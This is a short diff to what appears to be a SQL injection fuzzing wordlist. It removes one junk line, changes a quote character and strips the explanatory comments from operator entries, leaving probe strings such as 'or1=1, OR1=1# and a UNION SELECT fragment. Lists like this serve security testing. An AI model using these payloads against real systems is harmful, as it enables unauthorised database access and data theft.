@@ -1,7 +1,6 @@
 OR1=1
 'or1=1
 OR1=0
-asddsa
 ORx=x
 ORx=y
 OR1=1#
@@ -643,7 +642,7 @@ ZEROFILL
 '
 ''
 `
-``
+`
 ,
 "
 ""
@@ -668,11 +667,11 @@ ZEROFILL
 '''''''''''''UNION SELECT '2
 %00
 /*…*/ 
-+		addition, concatenate (or space in url)
-||		(double pipe) concatenate
-%		wildcard attribute indicator
-@variable	local variable
-@@variable	global variable
++		
+||		
+%		
+@variable	
+@@variable	
 # Numeric
 AND 1
 AND 0
